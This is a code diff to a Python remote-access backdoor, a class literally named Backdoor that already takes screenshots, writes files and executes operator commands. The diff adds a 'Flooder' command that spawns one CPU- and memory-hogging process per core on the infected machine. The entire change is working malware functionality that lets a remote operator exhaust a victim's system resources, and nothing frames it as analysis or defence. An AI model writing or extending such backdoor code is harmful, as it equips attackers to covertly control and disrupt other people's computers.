@@ -10,6 +10,7 @@ import ssl
 import platform
 import time
 import io
+import multiprocessing
 try:
     from PIL import ImageGrab
 except ImportError:
@@ -238,6 +239,45 @@ class Backdoor:
         except Exception as e:
             return f"[-] Error taking screenshot: {str(e)}"
 
+    def flood_resources(self, duration=30, ram_size_mb=100):
+        """
+        Floods system resources by spawning CPU and RAM-intensive processes
+        
+        Args:
+            duration: How long to run the attack in seconds
+            ram_size_mb: How much RAM to allocate per CPU core in MB
+        """
+        def hog(cpu_work=True, ram_size_mb=50):
+            """Function that hogs CPU and RAM."""
+            # Allocate RAM (list of ~ram_size_mb MB integers)
+            hog_mem = [0] * (ram_size_mb * 250_000)  # ~50 MB -> 250k ints
+            if cpu_work:
+                end_time = time.time() + duration
+                while time.time() < end_time:
+                    x = 123456 ** 2  # busy work to keep CPU busy
+            else:
+                time.sleep(duration)  # just hold memory without using CPU
+
+        try:
+            cores = multiprocessing.cpu_count()
+            processes = []
+            
+            # Start processes - one per core
+            for _ in range(cores):
+                p = multiprocessing.Process(target=hog, args=(True, ram_size_mb))
+                p.daemon = True  # Allow process to be terminated when parent exits
+                p.start()
+                processes.append(p)
+            
+            # Run for specified duration, then stop
+            time.sleep(duration)
+            for p in processes:
+                p.terminate()
+                
+            return f"[+] Finished resource flooding: used {cores} cores with {ram_size_mb}MB RAM each for {duration} seconds"
+        except Exception as e:
+            return f"[-] Error during resource flooding: {str(e)}"
+
     def run(self):
         while True:
             try:
@@ -255,6 +295,12 @@ class Backdoor:
                     command_result = self.write_file(command[1], command[2])
                 elif command[0] == "screenshot":
                     command_result = self.take_screenshot()
+                # Add this new condition for the Flooder command
+                elif command[0] == "Flooder":
+                    # Parse optional arguments if provided
+                    duration = int(command[1]) if len(command) > 1 else 30
+                    ram_mb = int(command[2]) if len(command) > 2 else 100
+                    command_result = self.flood_resources(duration, ram_mb)
                 else:
                     command_result = self.execute_command(command)
             except Exception as e:
